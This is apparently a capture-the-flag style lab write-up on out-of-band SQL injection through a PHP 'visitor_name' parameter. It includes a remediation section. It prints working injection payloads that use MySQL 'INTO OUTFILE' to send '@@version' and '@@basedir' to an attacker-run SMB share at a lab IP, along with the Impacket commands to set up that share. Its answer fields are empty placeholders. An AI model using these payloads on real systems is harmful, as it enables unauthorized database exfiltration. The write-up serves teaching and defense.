# Task 06: Out-of-Band (OOB) SQL Injection

## 1. Vulnerability

The target application was vulnerable to **Out-of-Band (OOB) SQL Injection** through the `visitor_name` parameter.

The application constructs the SQL query by directly inserting the user-controlled parameter:

```php
$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
```

The application also uses `multi_query()`, allowing multiple SQL statements to be processed.

The vulnerability allows an attacker to inject an additional SQL statement and use MySQL's `INTO OUTFILE`functionality to send information to an external SMB share.

---

## 2. Objective

The objectives of this task were:

1. Retrieve the MySQL server version using `@@version`.
2. Retrieve the MySQL base directory using `@@basedir`.

Because the application does not directly return the injected query's result, the information was retrieved through an **out-of-band SMB channel**.

---

## 3. Recon/Identification

The vulnerable endpoint was:

```
http://10.49.178.94/oob/search_visitor.php?visitor_name=Tim
```

The parameter identified for testing was:

```
visitor_name
```

The application uses this parameter directly in an SQL query:

```php
$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
```

The use of `multi_query()` also indicated that the application could process multiple SQL statements.

Therefore, the `visitor_name` parameter was tested for SQL injection.

<img width="1280" height="724" alt="Screenshot 2026-08-28 at 5 43 28 AM" src="https://github.com/user-attachments/assets/fba328e4-4c35-40fa-8b1a-b98402e23aba" />


---

## 4. Exploitation Methodology

Since the objective was to retrieve information through an out-of-band channel, an SMB server was started on the AttackBox.

First, the Impacket directory and smbserver.py was accessed:

```bash
locate smbserver.py
```

```bash
cd /opt/impacket/examples
```

Then the SMB server was started:

```bash
python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
```

The `/tmp` directory was shared through the SMB share named `logs`.

The SMB share could be checked using:

```bash
smbclient //ATTACKBOX_IP/logs -U guest -N
```

and:

```
ls
```

The SQL injection payload was then used to make the database write the requested information to the SMB share.

<img width="1111" height="713" alt="Screenshot 2026-08-28 at 6 04 49 AM" src="https://github.com/user-attachments/assets/298a637b-6cd3-445b-87b1-fdee11f1358e" />


---

## 5. Payload

### Question 1 — Retrieve `@@version`

The payload used was:

```
1'; SELECT @@version INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
```

The payload works by:

- `1'` — closing the original SQL string.
- `;` — terminating the original SQL statement.
- `SELECT @@version` — retrieving the MySQL server version.
- `INTO OUTFILE` — writing the result to a file.
- `\\192.168.189.227\logs\out.txt` — specifying the SMB destination.
- `-` — commenting out the remainder of the original query.

The payload was supplied through the `visitor_name` parameter.


<img width="1279" height="728" alt="Screenshot 2026-08-28 at 5 54 42 AM" src="https://github.com/user-attachments/assets/2cd07a68-2df7-4a33-8316-9a0288c21c35" />


After executing the request, the file was checked using:

```bash
ls /tmp
```

Then:

```bash
cat /tmp/out.txt
```

<img width="1097" height="649" alt="Screenshot 2026-08-28 at 5 54 25 AM" src="https://github.com/user-attachments/assets/e2e7ca9c-b777-4b63-981c-4a4918d776fb" />


### Question 1 Answer

```
[INSERT THE VALUE RETURNED BY cat /tmp/out.txt]
```

---

### Question 2 — Retrieve `@@basedir`

The same technique was used, but `@@version` was replaced with `@@basedir`.

Payload:

```
1'; SELECT @@basedir INTO OUTFILE '\\\\192.168.189.227\\logs\\out.txt'; --
```

<img width="1278" height="726" alt="Screenshot 2026-08-28 at 6 38 54 AM" src="https://github.com/user-attachments/assets/689e6ec4-0979-4cea-a7d1-dff65708d084" />


After executing the request, the output file was read using:

```bash
cat /tmp/out.txt
```
<img width="1078" height="579" alt="Screenshot 2026-08-28 at 6 13 23 AM" src="https://github.com/user-attachments/assets/bf1123f4-300d-4080-8cde-40418c1b0f38" />



### Question 2 Answer

```
[INSERT THE VALUE RETURNED BY cat /tmp/out.txt]
```

---

## 6. Result/Evidence

The exploitation successfully demonstrated OOB SQL injection.

For **Question 1**, the MySQL version was written to:

```
/tmp/out.txt
```

and retrieved using:

```bash
cat /tmp/out.txt
```

**Evidence:**

```
MySQL Version: [INSERT ACTUAL OUTPUT]
```

For **Question 2**, the MySQL base directory was similarly written to the SMB share and retrieved using:

```bash
cat /tmp/out.txt
```

**Evidence:**

```
MySQL Base Directory: [INSERT ACTUAL OUTPUT]
```

Recommended screenshots:

1. SMB server running.
2. Vulnerable URL/payload.
3. `ls /tmp` showing `out.txt`.
4. `cat /tmp/out.txt` showing the result.

---

## 7. Impact

An OOB SQL injection vulnerability can allow an attacker to retrieve sensitive database information even when the application does not directly display the result of an injected query.

In this lab, the vulnerability allowed database information such as:

- MySQL server version
- MySQL base directory

to be transferred through an external SMB channel.

In a more serious real-world scenario, OOB SQL injection could potentially be used to exfiltrate sensitive database information through available network channels.

---

## 8. Remediation

The application should avoid constructing SQL queries by directly concatenating user-controlled input.

Instead of:

```php
$sql = "SELECT * FROM visitor WHERE name = '$visitor_name'";
```

the developer should use **parameterized/prepared SQL statements**.

The application should also:

- Validate and constrain user input.
- Avoid unnecessary use of `multi_query()`.
- Apply least-privilege permissions to the database account.
- Restrict database-server outbound network access.
- Restrict dangerous file-writing functionality such as `INTO OUTFILE`.
- Properly monitor and log suspicious database activity.
- Use secure database configurations to limit unauthorized file operations.

### Conclusion

The task demonstrated how **Out-of-Band SQL Injection** can be used when the database does not directly return the injected query's output. By exploiting the vulnerable `visitor_name` parameter and using MySQL's `INTO OUTFILE`functionality, the requested database information was transferred through an SMB channel and retrieved from `/tmp/out.txt`.
